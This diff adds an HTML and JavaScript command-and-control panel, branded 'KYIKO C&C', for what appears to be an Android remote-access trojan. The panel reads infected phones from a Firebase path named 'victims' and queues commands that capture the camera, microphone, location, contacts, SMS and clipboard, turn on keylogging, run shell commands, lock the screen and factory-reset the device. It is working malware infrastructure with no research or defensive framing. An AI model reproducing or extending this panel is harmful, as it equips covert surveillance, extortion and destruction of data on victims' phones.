@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>KYIKO | C&C CENTER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,100;14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #090c14;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* LIQUID GLASS BACKGROUND */
+        .liquid-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: radial-gradient(ellipse at 30% 40%, #0f1625, #05070f);
+        }
+        
+        .liquid-bg::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            top: -50%;
+            left: -50%;
+            background: radial-gradient(circle, rgba(0, 255, 255, 0.06) 0%, transparent 70%);
+            animation: rotateLiquid 25s linear infinite;
+        }
+        
+        @keyframes rotateLiquid {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* GLASS COMPONENTS */
+        .glass {
+            background: rgba(12, 20, 32, 0.55);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            border-radius: 2rem;
+        }
+        
+        .glass-card {
+            background: rgba(8, 14, 24, 0.65);
+            backdrop-filter: blur(12px);
+            border-radius: 1.5rem;
+            border: 1px solid rgba(0, 230, 250, 0.2);
+            transition: all 0.25s ease;
+        }
+        
+        .glass-card:hover {
+            border-color: #0ff;
+            box-shadow: 0 8px 28px rgba(0, 200, 255, 0.15);
+            transform: translateY(-2px);
+        }
+        
+        /* LIQUID TEXT ANIMATION */
+        @keyframes liquidShine {
+            0% { background-position: 0% 50%; opacity: 0.9; }
+            50% { background-position: 100% 50%; opacity: 1; }
+            100% { background-position: 0% 50%; opacity: 0.9; }
+        }
+        
+        .liquid-text {
+            background: linear-gradient(125deg, #aaffff, #2a6dff, #6effe8, #aaffff);
+            background-size: 300% auto;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: liquidShine 5s ease infinite;
+        }
+        
+        /* WELCOME SCREEN */
+        .welcome-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(5, 7, 15, 0.92);
+            backdrop-filter: blur(20px);
+            transition: opacity 1.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+        
+        .welcome-card {
+            text-align: center;
+            padding: 3rem 4rem;
+            background: rgba(10, 18, 28, 0.7);
+            backdrop-filter: blur(24px);
+            border-radius: 3rem;
+            border: 1px solid rgba(0, 255, 255, 0.35);
+            box-shadow: 0 0 60px rgba(0, 255, 255, 0.15);
+            animation: floatGlow 3s ease infinite;
+        }
+        
+        @keyframes floatGlow {
+            0%, 100% { transform: translateY(0px); box-shadow: 0 0 40px rgba(0, 255, 255, 0.1); }
+            50% { transform: translateY(-8px); box-shadow: 0 0 70px rgba(0, 255, 255, 0.25); }
+        }
+        
+        .welcome-title {
+            font-size: 4rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin-bottom: 1rem;
+        }
+        
+        .welcome-sub {
+            font-size: 0.9rem;
+            opacity: 0.7;
+            letter-spacing: 0.3em;
+            margin-bottom: 2rem;
+        }
+        
+        .enter-btn {
+            background: rgba(0, 255, 255, 0.12);
+            border: 1.5px solid rgba(0, 255, 255, 0.5);
+            padding: 0.8rem 2.5rem;
+            border-radius: 3rem;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #0ff;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .enter-btn:hover {
+            background: #0ff;
+            color: #000;
+            box-shadow: 0 0 30px #0ff;
+            border-color: #0ff;
+        }
+        
+        /* MAIN DASHBOARD */
+        .dashboard {
+            opacity: 0;
+            transition: opacity 0.8s ease;
+        }
+        
+        .dashboard.visible {
+            opacity: 1;
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 1.5rem 2rem;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            padding: 1rem 2rem;
+        }
+        
+        .logo h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+        }
+        
+        .owner-badge {
+            background: rgba(0, 255, 255, 0.1);
+            border-left: 3px solid #0ff;
+            padding: 0.5rem 1.2rem;
+            border-radius: 2rem;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        
+        .devil-code {
+            font-family: monospace;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 0.5rem 1.2rem;
+            border-radius: 2rem;
+            font-size: 0.75rem;
+            cursor: pointer;
+            border: 1px solid #2a6dff;
+        }
+        
+        .stats-grid {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin-bottom: 2rem;
+        }
+        
+        .stat-item {
+            flex: 1;
+            min-width: 140px;
+            padding: 1.2rem;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #0ff;
+        }
+        
+        .commands-bar {
+            margin-bottom: 2rem;
+            padding: 1rem 1.5rem;
+        }
+        
+        .quick-cmds {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-top: 0.8rem;
+        }
+        
+        .quick-cmd {
+            background: rgba(0, 255, 255, 0.08);
+            border: 1px solid rgba(0, 255, 255, 0.25);
+            padding: 0.3rem 0.9rem;
+            border-radius: 2rem;
+            font-size: 0.7rem;
+            font-family: monospace;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+        
+        .quick-cmd:hover {
+            background: #0ff;
+            color: #000;
+        }
+        
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 1.2rem;
+            margin-top: 1rem;
+        }
+        
+        .device-card {
+            padding: 1.2rem;
+        }
+        
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 0.5rem;
+            margin-bottom: 0.7rem;
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #2eff9e;
+            box-shadow: 0 0 5px #2eff9e;
+            animation: pulse 1s infinite;
+        }
+        
+        .status-dot.offline {
+            background: #ff3a5e;
+            animation: none;
+            box-shadow: none;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.4; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); }
+        }
+        
+        .cmd-group {
+            display: flex;
+            gap: 0.5rem;
+            margin-top: 0.7rem;
+        }
+        
+        .cmd-input {
+            flex: 1;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #2a6dff;
+            border-radius: 2rem;
+            padding: 0.5rem 1rem;
+            color: white;
+            font-family: monospace;
+            font-size: 0.75rem;
+        }
+        
+        .cmd-btn {
+            background: linear-gradient(95deg, #1e2f5a, #0a1a2f);
+            border: none;
+            padding: 0.4rem 1rem;
+            border-radius: 2rem;
+            color: #0ff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: rgba(10, 20, 46, 0.9);
+            backdrop-filter: blur(12px);
+            padding: 0.6rem 1.3rem;
+            border-radius: 2rem;
+            border-left: 3px solid #0ff;
+            font-size: 0.75rem;
+            z-index: 999;
+            opacity: 0;
+            transition: 0.2s;
+            pointer-events: none;
+        }
+        
+        @media (max-width: 700px) {
+            .container { padding: 1rem; }
+            .welcome-title { font-size: 2.5rem; }
+            .welcome-card { padding: 2rem; margin: 1rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="liquid-bg"></div>
+
+<div class="welcome-screen" id="welcomeScreen">
+    <div class="welcome-card">
+        <div class="welcome-title liquid-text">KYIKO</div>
+        <div class="welcome-sub">COMMAND AND CONTROL</div>
+        <div class="enter-btn" id="enterBtn">ENTER</div>
+    </div>
+</div>
+
+<div class="dashboard" id="dashboard">
+    <div class="container">
+        <div class="glass header">
+            <div class="logo">
+                <h1 class="liquid-text">KYIKO</h1>
+                <div style="font-size: 0.6rem; opacity: 0.5;">C&C v4.0</div>
+            </div>
+            <div class="owner-badge" id="ownerName">OWNER: CYPHER</div>
+            <div class="devil-code" id="devilCodeBlock" onclick="copyDevilCode()">DEVIL CODE: <span id="devilCodeValue">---</span></div>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="glass-card stat-item"><div class="stat-number" id="totalDevices">0</div><div>TOTAL DEVICES</div></div>
+            <div class="glass-card stat-item"><div class="stat-number" id="onlineDevices">0</div><div>ONLINE</div></div>
+            <div class="glass-card stat-item"><div class="stat-number" id="totalLogs">0</div><div>LOGS</div></div>
+            <div class="glass-card stat-item"><div class="stat-number" id="cmdCount">0</div><div>COMMANDS</div></div>
+        </div>
+        
+        <div class="glass commands-bar">
+            <div style="font-weight: 600; font-size: 0.8rem;">BRUTAL COMMANDS</div>
+            <div class="quick-cmds" id="quickCommands"></div>
+        </div>
+        
+        <div style="display: flex; justify-content: space-between; margin-bottom: 0.8rem;">
+            <h2 class="liquid-text" style="font-weight: 700;">ACTIVE DEVICES</h2>
+            <span style="font-size: 0.65rem; background: rgba(0,255,255,0.1); padding: 0.2rem 0.7rem; border-radius: 1rem;">LIVE</span>
+        </div>
+        
+        <div id="devicesContainer" class="devices-grid">
+            <div class="glass-card" style="padding: 2rem; text-align: center;">AWAITING CONNECTION</div>
+        </div>
+    </div>
+</div>
+
+<div class="toast" id="toast">READY</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyDfJkL9qR3xV7mN2pQ5wE8tY6uIoP1aZbC",
+        authDomain: "kyiko-dc6c9.firebaseapp.com",
+        databaseURL: "https://kyiko-dc6c9-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "kyiko-dc6c9",
+        storageBucket: "kyiko-dc6c9.firebasestorage.app",
+        messagingSenderId: "167738484761",
+        appId: "1:167738484761:web:kyiko2024v1"
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    
+    let devilCode = "KYI-" + Math.random().toString(36).substring(2, 10).toUpperCase();
+    document.getElementById("devilCodeValue").innerText = devilCode;
+    let cmdCounter = 0;
+    
+    const brutalCmds = [
+        "/info", "/camera", "/mic", "/location", "/contacts", "/sms",
+        "/keylog_on", "/keylog_off", "/lock 5 m", "/lock 1 h", "/unlock",
+        "/toast ALERT", "/vibrate", "/reset", "/shell id", "/installed", "/clipboard"
+    ];
+    
+    const quickContainer = document.getElementById("quickCommands");
+    brutalCmds.forEach(cmd => {
+        let span = document.createElement("span");
+        span.className = "quick-cmd";
+        span.innerText = cmd;
+        span.onclick = () => {
+            let inputs = document.querySelectorAll('.cmd-input');
+            if (inputs.length === 1) inputs[0].value = cmd;
+            else if (inputs.length > 1) showToast("SELECT A DEVICE FIRST");
+            else showToast("NO ACTIVE DEVICE");
+        };
+        quickContainer.appendChild(span);
+    });
+    
+    function showToast(msg) {
+        let t = document.getElementById("toast");
+        t.innerText = msg;
+        t.style.opacity = "1";
+        setTimeout(() => t.style.opacity = "0", 1800);
+    }
+    
+    window.copyDevilCode = () => {
+        navigator.clipboard.writeText(devilCode);
+        showToast("DEVIL CODE COPIED");
+    };
+    
+    window.sendCommand = (deviceId, cmdText) => {
+        if (!cmdText.trim()) return;
+        cmdCounter++;
+        document.getElementById("cmdCount").innerText = cmdCounter;
+        database.ref(`victims/${deviceId}/commands`).set({
+            pending: cmdText,
+            timestamp: Date.now(),
+            status: "queued"
+        }).then(() => showToast(`CMD SENT: ${cmdText.substring(0, 30)}`))
+          .catch(() => showToast("FIREBASE ERROR"));
+    };
+    
+    function renderDashboard(snapshot) {
+        let devices = snapshot.val() || {};
+        let total = Object.keys(devices).length;
+        let online = 0, logs = 0;
+        document.getElementById("totalDevices").innerText = total;
+        
+        if (total === 0) {
+            document.getElementById("devicesContainer").innerHTML = `<div class="glass-card" style="padding: 2rem; text-align: center;">NO DEVICES CONNECTED</div>`;
+            document.getElementById("onlineDevices").innerText = "0";
+            document.getElementById("totalLogs").innerText = "0";
+            return;
+        }
+        
+        let html = "";
+        for (let [id, data] of Object.entries(devices)) {
+            let info = data.info || {};
+            let lastSeen = info.last_seen || 0;
+            let isOnline = (Date.now() - lastSeen) < 70000;
+            if (isOnline) online++;
+            let logCount = (data.response ? Object.keys(data.response).length : 0);
+            logs += logCount;
+            html += `
+                <div class="glass-card device-card">
+                    <div class="device-header">
+                        <strong>${info.model || "UNKNOWN"}</strong>
+                        <div class="status-dot ${!isOnline ? 'offline' : ''}"></div>
+                    </div>
+                    <div style="font-size: 0.65rem; font-family: monospace;">ID: ${id.substring(0, 10)}... | BATTERY: ${info.battery || "?"}%</div>
+                    <div class="cmd-group">
+                        <input type="text" class="cmd-input" id="cmd_${id}" placeholder="/info or /camera">
+                        <button class="cmd-btn" onclick="sendCommand('${id}', document.getElementById('cmd_${id}').value)">EXEC</button>
+                    </div>
+                    <div style="display: flex; gap: 0.3rem; margin-top: 0.5rem; flex-wrap: wrap;">
+                        <span class="quick-cmd" style="font-size:0.6rem;" onclick="document.getElementById('cmd_${id}').value='/info'; sendCommand('${id}','/info')">INFO</span>
+                        <span class="quick-cmd" style="font-size:0.6rem;" onclick="document.getElementById('cmd_${id}').value='/camera'; sendCommand('${id}','/camera')">CAM</span>
+                        <span class="quick-cmd" style="font-size:0.6rem;" onclick="document.getElementById('cmd_${id}').value='/lock 5 m 9999'; sendCommand('${id}','/lock 5 m 9999')">LOCK</span>
+                        <span class="quick-cmd" style="font-size:0.6rem; background:rgba(255,50,50,0.2);" onclick="document.getElementById('cmd_${id}').value='/reset'; sendCommand('${id}','/reset')">RESET</span>
+                    </div>
+                </div>
+            `;
+        }
+        document.getElementById("devicesContainer").innerHTML = html;
+        document.getElementById("onlineDevices").innerText = online;
+        document.getElementById("totalLogs").innerText = logs;
+    }
+    
+    database.ref('victims').on('value', (snap) => renderDashboard(snap));
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    let owner = urlParams.get('owner');
+    if (owner) document.getElementById("ownerName").innerText = "OWNER: " + decodeURIComponent(owner).toUpperCase();
+    
+    // WELCOME SCREEN TRANSITION
+    document.getElementById("enterBtn").onclick = () => {
+        let welcome = document.getElementById("welcomeScreen");
+        let dashboard = document.getElementById("dashboard");
+        welcome.style.opacity = "0";
+        setTimeout(() => {
+            welcome.style.display = "none";
+            dashboard.classList.add("visible");
+        }, 1000);
+    };
+    
+    console.log("KYIKO C&C ACTIVE");
+</script>
+</body>
+</html>
